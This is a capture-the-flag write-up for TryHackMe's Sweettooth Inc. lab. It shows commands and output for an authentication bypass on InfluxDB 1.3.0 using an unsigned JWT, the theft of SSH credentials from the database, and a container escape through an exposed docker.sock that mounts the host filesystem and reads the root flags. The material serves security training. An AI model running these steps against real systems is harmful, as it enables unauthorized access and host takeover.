Welcome to the write-up for [TryHackMe's Sweettooth Inc. room](https://tryhackme.com/room/sweettoothinc).

### Enumeration

Target machine: 10.10.169.219.                                                                                                                   

The first thing we do as usual is a port scan looking to enumerate the services available on the target machine.

A quick TCP Syn scan with nmap reports 3 tcp ports open 111, 222 and 8086.

```
└─$ sudo nmap -sS 10.10.169.219                                                                                                                    130 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 07:25 EDT
Nmap scan report for 10.10.169.219
Host is up (0.052s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
111/tcp  open  rpcbind
2222/tcp open  EtherNetIP-1
8086/tcp open  d-s-n

Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
```

After that we do some manual banner grabbing and discover a ssh server on port 2222.

```
└─$ telnet 10.10.169.219 2222
Trying 10.10.169.219...
Connected to 10.10.169.219.
Escape character is '^]'.
SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u8
^C^C^]
telnet> quit
Connection closed.
```

About port 8086, when working on software development we are accustomed to use ports 8080 - 80XX for web servers / application servers so I tried to probe it with a http client.
Learning that the server runs InfluxDB 1.3.0 on port 8086.

```
└─$ curl -v  10.10.169.219:8086                                                                                                               7 ⨯
*   Trying 10.10.169.219:8086...
* Connected to 10.10.169.219 (10.10.169.219) port 8086 (#0)
> GET / HTTP/1.1
> Host: 10.10.169.219:8086
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Content-Type: text/plain; charset=utf-8
< X-Content-Type-Options: nosniff
< X-Influxdb-Version: 1.3.0
< Date: Sun, 1 Aug 2021 15:08:44 GMT
< Content-Length: 19
< 
404 page not found
* Connection #0 to host 10.10.169.219 left intact
```

### Query influxDB

Doing some online research I found this blog post by Komodo Consulting, which describes how that version of influxDB is insecure by default that allows using a JWT token with an empty secret to query the DB without presenting any credentials.

https://www.komodosec.com/post/when-all-else-fails-find-a-0-day

The first things we'll do is find a valid username.

```
└─$ curl  http://10.10.169.219:8086/debug/requests 
{
"o5yY****:127.0.0.1": {"writes":2,"queries":2}
}
```

We can see the user o5yY**** is currently executing requests against the DB. We carry on with the next step  described in the blog post and create a json web token without a secret, we also provide username and expiration timestamp:

![create json web token](sweettooth_static/create_jwt.png)

Using the token just created, we can now query influxDB.
We learn that the databases stored in the instance are creds, docker, tanks, mixer, _internal.

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpY************************"  --data-urlencode "q=SHOW DATABASES"
{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["creds"],["docker"],["tanks"],["mixer"],["_internal"]]}]}]}
```

In order to answer questions related to data in influxdb, we'll execute a technique of showing the measurements on each DB and then select all entries from that measurement.

Showing measurements on tanks:

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpYfB0LtwiUY****************"  --data-urlencode 'q=SHOW MEASUREMENTS on tanks'
{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["fruitjuice_tank"],["gelatin_tank"],["sugar_tank"],["water_tank"]]}]}]}
```

We learn that there is a measurement on the tanks database called water_tank that we can use to answer the question about temperature of the water tank:

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vm81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpYfB0LtwiUY****************"  --data-urlencode 'db=tanks' --data-urlencode 'q=SELECT * FROM water_tank' | python3 -m json.tool > values_water


                        ],
                        [
                            "2021-05-18T14:00:00Z",
                            93.96,
                            ***
                        ],
                        [
```

Showing the measurements on mixer:

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpYfB0LtwiUY****************"  --data-urlencode 'q=SHOW MEASUREMENTS on mixer'
{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["mixer_stats"]]}]}]}                                                                                      
```

We learn that there is a measurement on the mixer database called mixer_stats that we can use to answer the question about the highest rpm of the mixer motor:

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpYfB0LtwiUY***************"  --data-urlencode 'db=mixer' --data-urlencode 'q=SELECT * FROM mixer_stats' | python3 -m json.tool > values_mixer

                        [
                            "2021-05-20T15:00:00Z",
                            61.33,
                            ****,
                            69.22
                        ]
```

Showing the measurements on creds:

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpYfB0LtwiUY****************"  --data-urlencode 'q=SHOW MEASUREMENTS on creds' 
{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["ssh"]]}]}]}
```

We learn that there is a measurement on the creds database called ssh that we can use to obtain user and password for the ssh server listening on port 2222:

```
└─$ curl -G http://10.10.169.219:8086/query -H "Accept: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI4MTY1NDU2fQ.bpd61sWs9b0Ey3uLpYfB0LtwiU****************"  --data-urlencode 'db=creds' --data-urlencode 'q=SELECT * FROM ssh' | python3 -m json.tool > values_ssh  

                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            77********,
                            "uzJk********"
                        ]

username: uzJk********
password: 77********
```

### Getting the User flag

Using the credentials obtained from querying influxDB to log into the ssh service running on port 2222, we can get the user flag by reading the contents of user.txt:

```
└─$ ssh -l uzJk6Ry98d8C 10.10.169.219 -p 2222                                                                                             255 ⨯
The authenticity of host '[10.10.169.219]:2222 ([10.10.169.219]:2222)' can't be established.
ECDSA key fingerprint is SHA256:m7yl6Q13T1eePlSp8SzRHz+ulMEmSYzqakcD/LmhPXo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.169.219]:2222' (ECDSA) to the list of known hosts.
uzJk********@10.10.169.219's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

uzJk********@d8daaf3c6ef4:~$ ls
data  meta.db  user.txt  wal
uzJk********@d8daaf3c6ef4:~$ cat user.txt 
THM{V4w4************ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd}
uzJk********@d8daaf3c6ef4:~$ 

```

### Privilege escalation

After performing the customary [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) run, we see that there are some references to docker.sock in the list of unexpected processes run by root. This is a lead that implies that the ssh service and influxdb might be running from a docker container.

I'm not pasting the entire linpeas footage, but find the relevant extract below:

```
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                          
root         1  0.0  0.5  20048  2792 ?        Ss   18:57   0:00 /bin/bash -c chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry***** -c '/initializeandquery.sh & /entrypoint.sh influxd'                                                                                  
root         7  0.0  0.5  44764  2688 ?        S    18:57   0:00 /bin/su uzJk6Ry***** -c /initializeandquery.sh & /entrypoint.sh influxd
uzJk6Ry+    10  0.0  0.4  11620  2364 ?        Ss   18:57   0:00  _ bash -c /initializeandquery.sh & /entrypoint.sh influxd
uzJk6Ry+    12  0.6  0.4  11676  2516 ?        S    18:57   0:01      _ /bin/bash /initializeandquery.sh
uzJk6Ry+  6789  0.0  0.5  19652  2656 ?        S    18:59   0:00      |   _ socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock
uzJk6Ry+  8083  0.0  0.7  70872  3732 ?        R    19:01   0:00      |   _ curl -o /dev/null -G http://localhost:8086/query?pretty=true --data-urlencode q=show databases --data-urlencode u=o5yY6yya --data-urlencode p=mJjeQ44e2unu
```

We can see above that process 1 makes /var/run/docker.sock writable, starts the ssh service and and runs as the user  uzJk****** the scripts initializeandquery.sh and entrypoint.sh with influxd parameter.

What's key to privilege escalation though is process 6789, that allow access on port 8080 TCP to the unix socket docker.sock.

Doing some research online I found this blog post from secureideas.com that describe how to escape the current container if you have access to the docker.sock:

https://secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html

Unfortunately the curl command in our session doesn't support the `--unix-socket` option, but as we seen above we can access docker.sock on TCP port 8080.

Doing that change, using localhost:8080 as target of our http queries, we can obtain valuable data. For example the available docker images:

```
uzJk********@c637b44a6c1e:~$ curl -s localhost:8080/images/json | jq '.'
[
  {                                                                                                                                             
    "Containers": -1,                                                                                                                           
    "Created": 1621349458,                                                                                                                      
    "Id": "sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e",                                                            
    "Labels": {},                                                                                                                               
    "ParentId": "sha256:213cc0db00922f32cf219291c2f81dfd410304b093a44703927a1db630d7722d",                                                      
    "RepoDigests": null,                                                                                                                        
    "RepoTags": [                                                                                                                               
      "sweettoothinc:latest"                                                                                                                    
    ],                                                                                                                                          
    "SharedSize": -1,                                                                                                                           
    "Size": 358659530,                                                                                                                          
    "VirtualSize": 358659530                                                                                                                    
  },                                                                                                                                            
  {                                                                                                                                             
    "Containers": -1,                                                                                                                           
    "Created": 1499487353,                                                                                                                      
    "Id": "sha256:e1b5eda429c335c11c07ea85e63f8a60518af69212f19fe50a2a28717744b384",                                                            
    "Labels": {},                                                                                                                               
    "ParentId": "",                                                                                                                             
    "RepoDigests": [                                                                                                                            
      "influxdb@sha256:99ef42027ac794b038ceb829537e92881e7648fa8c62c89ce84531d69177a635"                                                        
    ],                                                                                                                                          
    "RepoTags": [                                                                                                                               
      "influxdb:1.3.0"                                                                                                                          
    ],                                                                                                                                          
    "SharedSize": -1,                                                                                                                           
    "Size": 227323286,                                                                                                                          
    "VirtualSize": 227323286                                                                                                                    
  }                                                                                                                                             
]                                

```

We can see there are 2 images (sweettooth:latest and influxdb:1.3.0)

And the current containers:

```
uzJk********@c637b44a6c1e:~$ curl -s localhost:8080/containers/json | jq '.'
[
  {                                                                                                                                             
    "Id": "c637b44a6c1e85db377de8456a8f1c7350591587eb5e05c7f56c877a5263bc8e",                                                                   
    "Names": [                                                                                                                                  
      "/sweettoothinc"                                                                                                                          
    ],                                                                                                                                          
    "Image": "sweettoothinc:latest",                                                                                                            
    "ImageID": "sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e",                                                       
    "Command": "/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk******** -c '/initializeandquery.sh & /entrypoint.sh influxd''",                                                                                                                               
    "Created": 1631034419,                                                                                                                      
    "Ports": [                                                                                                                                  
      {                                                                                                                                         
        "IP": "0.0.0.0",                                                                                                                        
        "PrivatePort": 8086,                                                                                                                    
        "PublicPort": 8086,                                                                                                                     
        "Type": "tcp"                                                                                                                           
      },                                                                                                                                        
      {                                                                                                                                         
        "IP": "0.0.0.0",                                                                                                                        
        "PrivatePort": 22,                                                                                                                      
        "PublicPort": 2222,                                                                                                                     
        "Type": "tcp"                                                                                                                           
      }                                                                                                                                         
    ],                                                                                                                                          
    "Labels": {},                                                                                                                               
    "State": "running",                                                                                                                         
    "Status": "Up About an hour",                                                                                                               
    "HostConfig": {                                                                                                                             
      "NetworkMode": "default"                                                                                                                  
    },                                                                                                                                          
    "NetworkSettings": {                                                                                                                        
      "Networks": {                                                                                                                             
        "bridge": {                                                                                                                             
          "IPAMConfig": null,                                                                                                                   
          "Links": null,                                                                                                                        
          "Aliases": null,                                                                                                                      
          "NetworkID": "0b0092a25f86a651c9234132fc8d9f926adee9678a58c1c36dc5d860315cdbfa",                                                      
          "EndpointID": "6ec91733fbf5f2e8662a26dc4bedf508810f112c6596f4ffbc36c1715e7681cd",                                                     
          "Gateway": "172.17.0.1",                                                                                                              
          "IPAddress": "172.17.0.2",                                                                                                            
          "IPPrefixLen": 16,                                                                                                                    
          "IPv6Gateway": "",                                                                                                                    
          "GlobalIPv6Address": "",                                                                                                              
          "GlobalIPv6PrefixLen": 0,                                                                                                             
          "MacAddress": "02:42:ac:11:00:02",                                                                                                    
          "DriverOpts": null                                                                                                                    
        }                                                                                                                                       
      }                                                                                                                                         
    },                                                                                                                                          
    "Mounts": [                                                                                                                                 
      {                                                                                                                                         
        "Type": "volume",                                                                                                                       
        "Name": "8209a2ec9fe0a1ff40e6148df792def738792c8dc8b1f539e85f2fa580826584",                                                             
        "Source": "",                                                                                                                           
        "Destination": "/var/lib/influxdb",                                                                                                     
        "Driver": "local",                                                                                                                      
        "Mode": "",                                                                                                                             
        "RW": true,                                                                                                                             
        "Propagation": ""                                                                                                                       
      },                                                                                                                                        
      {                                                                                                                                         
        "Type": "bind",                                                                                                                         
        "Source": "/var/run/docker.sock",                                                                                                       
        "Destination": "/var/run/docker.sock",                                                                                                  
        "Mode": "",                                                                                                                             
        "RW": true,                                                                                                                             
        "Propagation": "rprivate"                                                                                                               
      }                                                                                                                                         
    ]                                                                                                                                           
  }                                                                                                                                             
]                       
```

We can see some interesting things from the above extract.
There is 1 container running, which is mounting the host docker unix socket in /var/run/docker.sock with RW perms and mounts as well a volume to /var/lib/influxdb.
It is exposing port 8086 from the container on port 8086 and port 22 from the container to port 2222.
The command executed at the start of the container is the following:

```
    "Command": "/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk******** -c '/initializeandquery.sh & /entrypoint.sh influxd''",                                                                                                                               
```

Following the technique described in the mentioned blog post we can create a new container, I tried creating first a container based on the sweettooth image, but the output I got when attaching to the socket was impossible to follow, I decided then to create a new container definition based on the influxdb image, please note that I mounted the root filesystem of the host in the /host directory:

```
uzJk********@c637b44a6c1e:~$  echo -e '{"Image":"influxdb:1.3.0","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"volume","Name":"8209a2ec9fe0a1ff40e6148df792def738792c8dc8b1f539e85f2fa580826584","Source":"","Destination":"/var/lib/influxdb","Target":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Target":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"},{"Type":"bind","Source":"/","Target":"/host"}]}' > container.json
```

After creating the new container definition json file, I used the docker api to create the container:

```
uzJk********@c637b44a6c1e:~$ curl -XPOST -H "Content-Type: application/json" -d "$(cat container.json)" http://localhost:8080/containers/create{"Id":"cd7b05f44df3c516f533f448d17b0c14e69e24efe0053c905612f24009a357d6","Warnings":null}
```

Then we start the container:

```
uzJk********@33829c3167b5:~$ curl -XPOST  http://localhost:8080/containers/cd7b/start
```

Then we can attach to the container shell using socat using the same technique described in the blog post:

```
uzJk********@c637b44a6c1e:~$ socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/cd7b/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

HTTP/1.1 101 UPGRADED
Content-Type: application/vnd.docker.raw-stream
Connection: Upgrade
Upgrade: tcp

ls
hbin
boot
dev
entrypoint.sh
etc
home
host
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

### Getting the 2 Root flags

Searching for the root.txt file on the filesystem:

```
find / -name root.txt
/host/root/root.txt
find: �File system loop detected; `/host/var/lib/docker/aufs/mnt/6707d5ed09b9d023436b7c663fd7f4585d57e904c2316cbf9f5c831da479258a' is part of the same file system loop as `/'.
�/host/var/lib/docker/aufs/mnt/f0a90070852e2e2454e17f5ce4e5014d9d0de8c1306ebb973c4d04074413e280/root/root.txt
/host/var/lib/docker/aufs/diff/20629420626c70a9bdf5807427da0badebc8e5d842cb82ae3ff83822b18c9e2a/root/root.txt
```

The above extract is a bit confusing, I think I created a filesystem root by mounting / in /host, but that is not a problem to find our 2 root flags!

First one:

```
cat /host/var/lib/docker/aufs/mnt/f0a90070852e2e2454e17f5ce4e5014d9d0de8c1306ebb973c4d04074413e280/root/root.txt
THM{5qsDivHd********}
```

Second one:

```
cd /host/root
ls
        root.txt
cat root.txt
THM{nY2ZahyF********}
```
